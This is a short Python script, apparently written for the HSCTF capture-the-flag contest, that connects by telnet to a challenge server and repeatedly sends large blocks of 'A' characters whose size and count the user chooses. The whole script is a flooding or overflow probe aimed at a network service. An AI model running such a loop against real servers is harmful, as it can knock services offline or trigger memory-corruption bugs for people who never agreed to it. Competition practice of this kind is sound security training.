#!/usr/bin/python3
import telnetlib

def spam(amt):
    print("Connecting...")
    t = telnetlib.Telnet('misc.hsctf.com', 8550)
    print("Sending %i KB" % amt)
    t.write(('A'*amt*1024).encode('utf-8'))
    print("Success")
    print('Printing terminal output')
    print(t.read_all())
    return True

def main():
    size = input("Berapa KB: ")
    limit = input("Berapa kali: ")
    for i in range(int(limit)):
        if spam(int(size)):
            continue

if __name__ == '__main__':
    main()
